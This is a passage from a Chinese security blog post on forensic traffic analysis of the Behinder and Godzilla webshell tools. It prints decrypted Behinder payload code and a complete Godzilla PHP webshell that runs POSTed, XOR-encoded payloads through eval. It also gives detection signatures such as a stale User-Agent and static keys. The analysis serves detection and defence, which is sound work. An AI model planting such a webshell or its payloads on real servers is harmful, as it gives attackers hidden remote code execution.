   &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>,<span class="string">&#x27;---&#x27;</span>)!==<span class="literal">false</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$parts</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27; &#x27;</span>,<span class="variable">$s</span>);</span><br><span class="line">			<span class="variable">$ip</span>=<span class="variable">$parts</span>[<span class="number">1</span>];</span><br><span class="line">			<span class="title function_ invoke__">array_push</span>(<span class="variable">$result</span>,<span class="variable">$ip</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//var_dump(explode(&#x27; &#x27;,$s));</span></span><br><span class="line">           <span class="comment">// array_push($result,explode(&#x27; &#x27;,$s)[1]);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    	<span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;</span><br><span class="line">	<span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$whatever</span>=<span class="string">&quot;SnFNVUd3dDBJbjc2azFFbEtZM1hVWWlmc1NjM2tBMjZFeUcwb25Lbmd2Mkp2N3cxaGNvajZQZTlnWkxYRmU3S3ZQYjRadHZxUHFteU9zT0JyVVBmN2l0cFlUVlpqSkE2T3RNeEk5R0FTR2FQUE9aRmZZaDM2azA0cnhzM293ZVZlOFB4aktvVlRyTzBEazZQM3EzcE5lM3p3d0x4eUFXZXRrellYSnpnNWhHSUdwcVVTV0RsZmZUcEtmN1pLQmtRYmJvQ3NDU3VlUXJQdDlXdGdycGxOV0I2T1ZBOHdLaWlMNHU3cjh3ZFZjRFg2djdMOHRORWpvbFVmSzhvYkFnRUFOZWZLYzVVUWdkQ2dkTTVrWHU4YlpGOE9wNndQR3VaWVNRT1RsdWE4WXQ2bGFhVGZrMzVmc3dSUW05MnBycUlxOUYxU3pUeGlxeFNZTTlTUHBHd3RhVnVJcmxFMXZGYklzSHJOOUppVEVRUHlDSjlSQTV2RkhBSzZ5Q25WdjBEbktRbElqRmFMeXJScGhtNE11SWRaUmY5NXZZVEZlcDlTbnZOVGRMQ2d0UXdSZlRtZmJhQW5KUGd4SmlvamhTNWd4QlhJWmxpdkxGT0U3YjRYVFFZSnJudTNBaEN4NzduajJnaDdyb1ZwOGozTVFuZUhhTWtpR0NqYjhkSUh1ZWdzZ0lMWms=&quot;</span>;<span class="variable">$whatever</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$whatever</span>);</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$whatever</span>);</span><br></pre></td></tr></table></figure>
<p>不难看出是在获取 <code>phpinfo()</code> 和其他基本信息，这也正是在
Behinder 界面所看到的结果。</p>
<p>如果再进一步，比如说获取目录信息，可以得到这样的参数（删除了部分代码）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=UTF-8&#x27;</span>);</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$mode</span>, <span class="variable">$path</span> = <span class="string">&quot;.&quot;</span>, <span class="variable">$hash</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$blockIndex</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$blockSize</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$content</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$charset</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$newpath</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$createTimeStamp</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$accessTimeStamp</span> = <span class="string">&quot;&quot;</span>, <span class="variable">$modifyTimeStamp</span> = <span class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$path</span>=<span class="title function_ invoke__">getgbkStr</span>(<span class="variable">$path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$path</span> == <span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="variable">$path</span> = <span class="title function_ invoke__">getcwd</span>();</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$mode</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;list&quot;</span>:</span><br><span class="line">            <span class="variable">$allFiles</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line">            <span class="variable">$objArr</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$allFiles</span> <span class="keyword">as</span> <span class="variable">$fileName</span>) &#123;</span><br><span class="line">                <span class="variable">$fullPath</span> = <span class="variable">$path</span> . <span class="variable">$fileName</span>;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">function_exists</span>(<span class="string">&quot;mb_convert_encoding&quot;</span>)) &#123;</span><br><span class="line">                    <span class="variable">$fileName</span> = <span class="title function_ invoke__">getSafeStr</span>(<span class="variable">$fileName</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$fileName</span> = <span class="title function_ invoke__">mb_convert_encoding</span>(<span class="variable">$fileName</span>, <span class="string">&#x27;UTF-8&#x27;</span>, <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$fileName</span>, <span class="string">&quot;UTF-8,GBK&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$obj</span> = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;name&quot;</span> =&gt; <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$fileName</span>),</span><br><span class="line">                    <span class="string">&quot;size&quot;</span> =&gt; <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">filesize</span>(<span class="variable">$fullPath</span>)),</span><br><span class="line">                    <span class="string">&quot;lastModified&quot;</span> =&gt; <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, <span class="title function_ invoke__">filemtime</span>(<span class="variable">$fullPath</span>)))</span><br><span class="line">                );</span><br><span class="line">                <span class="variable">$obj</span>[<span class="string">&quot;perm&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>((<span class="title function_ invoke__">is_readable</span>(<span class="variable">$fullPath</span>) ? <span class="string">&quot;R&quot;</span> : <span class="string">&quot;-&quot;</span>) . <span class="string">&quot;/&quot;</span> . (<span class="title function_ invoke__">is_writable</span>(<span class="variable">$fullPath</span>) ? <span class="string">&quot;W&quot;</span> : <span class="string">&quot;-&quot;</span>) . <span class="string">&quot;/&quot;</span> . (<span class="title function_ invoke__">is_executable</span>(<span class="variable">$fullPath</span>) ? <span class="string">&quot;E&quot;</span> : <span class="string">&quot;-&quot;</span>));</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$fullPath</span>)) &#123;</span><br><span class="line">                    <span class="variable">$obj</span>[<span class="string">&quot;type&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$obj</span>[<span class="string">&quot;type&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;directory&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">array_push</span>(<span class="variable">$objArr</span>, <span class="variable">$obj</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">            <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$objArr</span>));</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;show&quot;</span>:</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Encrypt</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; </span><br><span class="line">	<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    	<span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;</span><br><span class="line">	<span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$after</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$mode</span>=<span class="string">&quot;bGlzdA==&quot;</span>;<span class="variable">$mode</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$mode</span>);<span class="variable">$path</span>=<span class="string">&quot;L3Zhci93d3cvaHRtbC8=&quot;</span>;<span class="variable">$path</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$path</span>);<span class="variable">$hash</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$blockIndex</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$blockSize</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$content</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$charset</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$newpath</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$createTimeStamp</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$accessTimeStamp</span>=<span class="string">&quot;&quot;</span>;<span class="variable">$modifyTimeStamp</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">main</span>(<span class="variable">$mode</span>,<span class="variable">$path</span>,<span class="variable">$hash</span>,<span class="variable">$blockInde</span>,<span class="variable">$accessTimeStamp</span>,<span class="variable">$modifyTimeStamp</span>);</span><br></pre></td></tr></table></figure>
<p>可以发现与 AntSword 不同，Behinder
倾向于一次注入所有的功能代码，随后通过函数调用的方式改变马的行为，其中
<code>mode</code> 是 <code>list</code>，对应列出目录的代码。</p>
<h3 id="逆向">逆向</h3>
<p>当然想分析 Behinder 的行为，跟分析 AntSword
是一样的，我们得从源代码入手。</p>
<p>使用 jdax 对 Behinder.jar 进行逆向，具体细节不再阐述，其中</p>
<ul>
<li>源代码的 <code>net.rebeyond.behinder.core.ShellService</code>
类负责了基本的 WebShell
功能，主要逻辑是通过向模板代码中添加运行代码，例如上文中的
<code>main($mode,$path,$hash,$blockInde,$accessTimeStamp,$modifyTimeStamp);</code>
那样。</li>
<li>资源文件 <code>net.rebeyond.behinder.payload</code>
下打包了所有可用的模板代码，可以根据此作为特征进行防御，其中
<code>net.rebeyond.behinder.payload.php</code> 下的
<code>BasicInfo.php</code> 文件就是抓包时看到的代码。</li>
<li>源代码 <code>net.rebeyond.memshell</code> 是内存马相关的类。</li>
</ul>
<h3 id="防御-1">防御</h3>
<p>可以基于 <code>net.rebeyond.behinder.payload</code>
对相关内容进行特征抓取，但 Behinder
的难点在于其全过程流量加密，使得无法轻易感知。但与之相对的特点是每次传输的内容比较大，且默认的
UA 较老
<code>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101 Firefox/79.0</code>，同时密钥并非动态，非
AES 加密容易破解，AES 加密可以进行差分攻击。</p>
<h2 id="godzilla">Godzilla</h2>
<h3 id="抓包-2">抓包</h3>
<p>Godzilla 与 Behinder 行为较为类似，不过 Godzilla
的流量更加隐蔽也更加复杂。</p>
<p>使用 Godzilla 的 PHP_XOR_BASE64 的动态加密功能，生成的服务端 Shell
如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>抓到的包经过 Behinder
同样的解密脚本（密码需要更改），得到如下格式化代码（由于代码太长，删去部分）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$parameters</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$_SES</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="variable">$pms</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
<p>可以看出与 Behinder 一致，是一个格式化代码，但是结合 Shell
代码来看，Godzilla 会将这部分模板代码注入到 Session 中，即
<code>$_SESSION[$payloadName]=encode($data,$key);</code>，这样避免了上文提到
Behinder 的多个交互流量过大的情况。</p>
<p>在这之后的流量会通过注入的代码中的 <code>run</code> 函数进行调用，即
<code>@run($data)</code>。</p>
<blockquote>
<p><code>run</code> 传递的参数中会有一定的序列化（格式化），可以参考
<code>formatParameter</code> 函数，不影响解析。</p>
</blockquote>
<p>在注入 Session 后的一个流量，会调用 <code>test</code>
函数，即参数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;methodName\x02\x04\x00\x00\x00test&#x27;</span></span><br></pre></td></tr></table></figure>
<p>返回值会前后携带固定的 md5 值的前后 16 个字符，与加密逻辑一致。</p>
<p>不过需要注意的是，有时 Godzilla 会使用 gzip
进行压缩以减小数据传输量。</p>
<p>其余行为与 Behinder 类似。</p>

    </div>

    
    
    

    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>qsdz
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://hasegawaazusa.github.io/traffic-analysis-note.html" title="流量分析笔记">https://hasegawaazusa.github.io/traffic-analysis-note.html</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/forensics/" rel="tag"><i class="fa fa-tag"></i> forensics</a>
              <a href="/tags/traffic/" rel="tag"><i class="fa fa-tag"></i> traffic</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/bayesian-decision-theory.html" rel="prev" title="模式识别-贝叶斯决策论笔记">
                  <i class="fa fa-chevron-left"></i> 模式识别-贝叶斯决策论笔记
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/control-system.html" rel="next" title="自动控制系统-控制系统">
                  自动控制系统-控制系统 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2022 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">761k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">11:31</span>
  </span>
</div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  




  

  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
<script src="/js/third-party/math/mathjax.js"></script>



</body>
</html>
